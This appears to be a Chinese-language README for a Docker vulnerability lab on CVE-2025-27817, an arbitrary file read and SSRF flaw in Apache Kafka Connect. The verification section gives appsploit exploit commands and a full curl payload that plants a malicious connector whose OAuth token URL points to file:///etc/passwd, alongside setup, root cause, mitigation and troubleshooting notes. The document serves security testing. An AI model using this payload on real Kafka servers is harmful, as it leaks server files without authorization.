# CVE-2025-27817 Apache Kafka Connect 任意文件读取漏洞

## 漏洞描述

Apache Kafka Connect 存在任意文件读取和 SSRF 漏洞。攻击者可以通过创建恶意连接器配置，利用 OAuth Bearer Token 端点 URL 参数读取服务器上的任意文件。

- **漏洞编号**: CVE-2025-27817
- **漏洞类型**: 任意文件读取 / SSRF
- **影响版本**: Apache Kafka 3.1.0 - 3.9.0
- **测试版本**: Apache Kafka 3.5.x (Confluent Platform 7.5.0)
- **风险等级**: 高危

## 版本说明

本测试环境使用 **Confluent Platform 7.5.0**，对应 **Apache Kafka 3.5.x**，在漏洞影响范围内。

### Confluent Platform 与 Apache Kafka 版本对应关系

| Confluent Platform | Apache Kafka | 是否受影响 | 说明 |
|-------------------|--------------|---------|------|
| CP 7.1.x | Kafka 3.1.x | ✓ 受影响 | 漏洞起始版本 |
| CP 7.2.x | Kafka 3.2.x | ✓ 受影响 | |
| CP 7.3.x | Kafka 3.3.x | ✓ 受影响 | |
| CP 7.4.x | Kafka 3.4.x | ✓ 受影响 | |
| CP 7.5.x | Kafka 3.5.x | ✓ 受影响 | **本环境使用版本** |
| CP 7.6.x | Kafka 3.6.x | ✓ 受影响 | |
| CP 7.7.x | Kafka 3.7.x | ✓ 受影响 | |
| CP 7.8.x | Kafka 3.8.x | ✓ 受影响 | |
| CP 7.9.x | Kafka 3.9.x | ✓ 受影响 | 漏洞结束版本 |

### 测试其他版本

如需测试其他受影响版本，修改 `docker-compose.yaml` 中的镜像版本即可：

```yaml
# 例如测试 Kafka 3.8.x
kafka:
  image: confluentinc/cp-kafka:7.8.0  # 修改版本号

kafka-connect:
  image: confluentinc/cp-kafka-connect:7.8.0  # 修改版本号

zookeeper:
  image: confluentinc/cp-zookeeper:7.8.0  # 修改版本号
```

然后重启环境：
```bash
docker-compose down -v
docker-compose up -d
```

## 环境搭建

### 前置要求

- Docker Desktop (支持 ARM64)
- Docker Compose

### 启动测试环境

在 `vul/cve-2025-27817` 目录下执行：

```bash
# 启动 Kafka 集群和 Kafka Connect
docker-compose up -d

# 查看服务状态
docker-compose ps

# 查看 Kafka Connect 日志
docker-compose logs -f kafka-connect
```

等待约 30-60 秒，直到所有服务完全启动。可以通过以下命令验证 Kafka Connect 是否就绪：

```bash
curl http://localhost:8083/
```

如果返回 Kafka Connect 的版本信息，说明服务已就绪。

### 重启测试环境（如果遇到问题）

```bash
# 完全清理并重启
docker-compose down -v
docker-compose up -d

# 等待服务就绪
sleep 30
curl http://localhost:8083/
```

### 停止测试环境

```bash
# 停止并删除容器
docker-compose down

# 停止并删除容器、网络和数据卷（完全清理）
docker-compose down -v
```

## 漏洞验证

### 1. 使用 appsploit 工具检测漏洞

```bash
# 编译项目（如果还没编译）
go build -o appsploit ./cmd/appsploit

# 检测漏洞是否存在（使用 --url/-u 参数）
./appsploit checksec CVE-2025-27817 -u http://localhost:8083

# 或使用别名
./appsploit checksec cve_2025_27817 -u http://localhost:8083

# 如果目标URL不包含协议，会自动添加http://
./appsploit checksec CVE-2025-27817 -u localhost:8083

# 如果目标环境的 Kafka Broker 地址不同，使用 --custom-data 参数
./appsploit checksec CVE-2025-27817 -u http://localhost:8083 --custom-data broker=192.168.1.100:9092
```

### 2. 利用漏洞读取文件

```bash
# 读取 /etc/passwd 文件（默认）
./appsploit exploit CVE-2025-27817 -u http://localhost:8083

# 读取指定文件
./appsploit exploit CVE-2025-27817 -u http://localhost:8083 --file /etc/hosts

# 读取其他系统文件
./appsploit exploit CVE-2025-27817 -u http://localhost:8083 --file /etc/hostname

# 使用HTTPS
./appsploit exploit CVE-2025-27817 -u https://example.com:8083 --file /etc/passwd

# 指定自定义 Kafka Broker 地址（当目标环境的 Kafka 配置不同时）
./appsploit exploit CVE-2025-27817 -u http://localhost:8083 --custom-data broker=192.168.1.100:9092 --file /etc/passwd
```

### 3. 使用传统参数方式（针对非HTTP漏洞）

```bash
# 使用 target/port/tls 参数
./appsploit checksec CVE-2025-27817 -t localhost -p 8083
./appsploit exploit CVE-2025-27817 -t localhost -p 8083 -s --file /etc/passwd
```

### 4. 手动验证（可选）

#### 创建恶意连接器

```bash
curl -X POST http://localhost:8083/connectors \
  -H "Content-Type: application/json" \
  -d '{
    "name": "test-file-read",
    "config": {
      "connector.class": "org.apache.kafka.connect.mirror.MirrorHeartbeatConnector",
      "heartbeats.topic.replication.factor": "1",
      "replication.factor": "1",
      "source.cluster.alias": "source",
      "target.cluster.alias": "target",
      "source.cluster.bootstrap.servers": "kafka:9092",
      "target.cluster.bootstrap.servers": "kafka:9092",
      "topics": ".*",
      "groups": ".*",
      "sync.group.offsets.enabled": "true",
      "emit.heartbeats.enabled": "true",
      "producer.override.sasl.mechanism": "OAUTHBEARER",
      "producer.override.security.protocol": "SASL_PLAINTEXT",
      "producer.override.sasl.oauthbearer.token.endpoint.url": "file:///etc/passwd",
      "producer.override.sasl.jaas.config": "org.apache.kafka.common.security.oauthbearer.OAuthBearerLoginModule required;",
      "producer.override.sasl.login.callback.handler.class": "org.apache.kafka.common.security.oauthbearer.secured.OAuthBearerLoginCallbackHandler"
    }
  }'
```

#### 重启连接器

```bash
curl -X POST http://localhost:8083/connectors/test-file-read/restart
```

#### 检查状态（文件内容会出现在错误信息中）

```bash
curl http://localhost:8083/connectors/test-file-read/status
```

#### 清理连接器

```bash
curl -X DELETE http://localhost:8083/connectors/test-file-read
```

## 漏洞原理

该漏洞利用了 Kafka Connect 在配置 OAuth Bearer Token 时的不当处理。当指定 `file://` 协议的 URL 作为 Token 端点时，Kafka Connect 会尝试读取本地文件内容，并在错误消息中泄露文件内容。

攻击步骤：
1. 创建恶意 MirrorHeartbeatConnector 配置
2. 在 `producer.override.sasl.oauthbearer.token.endpoint.url` 中指定 `file:///path/to/file`
3. 配置连接器连接到实际存在的 Kafka Broker（默认 kafka:9092）
4. 重启连接器触发文件读取
5. 从连接器状态的错误信息中提取文件内容

## 参数说明

### --custom-data 通用参数

`--custom-data` 是一个通用参数，用于传递特定漏洞需要的额外配置。格式为 `key=value`，多个值用逗号分隔。

**CVE-2025-27817 支持的参数：**
- `broker`: Kafka Broker 地址，默认为 `kafka:9092`

**使用示例：**
```bash
# 单个参数
--custom-data broker=192.168.1.100:9092

# 多个参数（预留用于其他漏洞）
--custom-data broker=192.168.1.100:9092,timeout=30

# 简写
--cd broker=192.168.1.100:9092
```

**为什么需要 broker 参数？**

在 Docker 测试环境中，Kafka Broker 的地址是 `kafka:9092`（服务名）。但在实际渗透测试中：
- 目标环境可能使用不同的 Broker 地址
- Broker 可能是 IP 地址或域名
- 端口可能不是默认的 9092

通过 `--custom-data broker=xxx` 参数，可以灵活适配不同的目标环境。

## 安全建议

1. 升级到修复版本的 Apache Kafka
2. 限制 Kafka Connect 的网络访问
3. 实施严格的连接器配置审核
4. 监控异常的连接器创建和配置活动
5. 使用最小权限原则运行 Kafka Connect

## 故障排查

### 问题：Kafka Connect 无法连接到 Kafka Broker

**症状**：日志中出现 `Connection to node -1 (/127.0.0.1:9092) could not be established`

**解决方案**：
1. 确保使用最新的代码（已修复为使用 `kafka:9092`）
2. 完全重启环境：
```bash
cd vul/cve-2025-27817
docker-compose down -v
docker-compose up -d
```
3. 等待 30-60 秒让所有服务完全启动
4. 验证服务状态：
```bash
# 检查所有容器是否运行
docker-compose ps

# 检查 Kafka 日志
docker-compose logs kafka | tail -20

# 检查 Kafka Connect 日志
docker-compose logs kafka-connect | tail -20
```

### 问题：端口已被占用

**症状**：启动时报错端口被占用

**解决方案**：
```bash
# 检查端口占用
lsof -i :2181  # Zookeeper
lsof -i :9092  # Kafka
lsof -i :8083  # Kafka Connect

# 停止占用端口的进程或修改 docker-compose.yaml 中的端口映射
```

### 问题：Docker 镜像拉取失败

**症状**：ARM 架构镜像下载失败

**解决方案**：
- 确保 Docker Desktop 已启用 ARM64 支持
- 检查网络连接
- 尝试使用国内镜像源

## 参考链接

- [CVE-2025-27817 POC](https://github.com/iSee857/CVE-2025-27817)
- [Apache Kafka Documentation](https://kafka.apache.org/documentation/)
- [Confluent Platform Documentation](https://docs.confluent.io/)
